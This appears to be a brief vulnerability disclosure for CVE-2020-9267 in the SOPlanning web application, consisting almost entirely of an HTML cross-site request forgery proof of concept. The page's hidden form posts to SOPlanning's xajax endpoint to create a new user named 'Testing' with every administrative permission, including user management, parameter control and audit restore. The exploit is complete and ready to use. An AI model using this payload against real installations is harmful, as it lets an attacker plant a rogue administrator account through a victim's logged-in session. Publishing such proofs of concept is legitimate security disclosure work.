CVE-2020-9267

The SOPlanning web application is vulnerable to CSRF that enables a user to be added.

CSRF POC:
````
<html>

  <body>

  <script>history.pushState('', '', '/')</script>

    <form action="http://10.22.6.208/soplanning/www/process/xajax_server.php" method="POST">

      <input type="hidden" name="xajax" value="submitFormUser" />

      <input type="hidden" name="xajaxr" value="1581700271752" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="Testing" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="1" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="Testing" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="test&#64;test&#46;com" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="Test" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="test" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="true" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="&#35;FFFFFF" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="false" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="false" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="&lt;xjxobj&gt;&lt;e&gt;&lt;k&gt;0&lt;&#47;k&gt;&lt;v&gt;users&#95;manage&#95;all&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;e&gt;&lt;k&gt;1&lt;&#47;k&gt;&lt;v&gt;projects&#95;manage&#95;all&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;e&gt;&lt;k&gt;2&lt;&#47;k&gt;&lt;v&gt;projectgroups&#95;manage&#95;all&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;e&gt;&lt;k&gt;3&lt;&#47;k&gt;&lt;v&gt;tasks&#95;modify&#95;all&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;e&gt;&lt;k&gt;4&lt;&#47;k&gt;&lt;v&gt;tasks&#95;view&#95;all&#95;projects&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;e&gt;&lt;k&gt;5&lt;&#47;k&gt;&lt;v&gt;tasks&#95;view&#95;all&#95;users&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;e&gt;&lt;k&gt;6&lt;&#47;k&gt;&lt;v&gt;lieux&#95;all&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;e&gt;&lt;k&gt;7&lt;&#47;k&gt;&lt;v&gt;ressources&#95;all&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;e&gt;&lt;k&gt;8&lt;&#47;k&gt;&lt;v&gt;audit&#95;restore&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;e&gt;&lt;k&gt;9&lt;&#47;k&gt;&lt;v&gt;parameters&#95;all&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;e&gt;&lt;k&gt;10&lt;&#47;k&gt;&lt;v&gt;stats&#95;users&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;e&gt;&lt;k&gt;11&lt;&#47;k&gt;&lt;v&gt;stats&#95;projects&lt;&#47;v&gt;&lt;&#47;e&gt;&lt;&#47;xjxobj&gt;" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="true" />

      <input type="hidden" name="xajaxargs&#91;&#93;" value="&lt;xjxobj&gt;&lt;&#47;xjxobj&gt;" />

      <input type="submit" value="Submit request" />

    </form>

  </body>

</html>


````
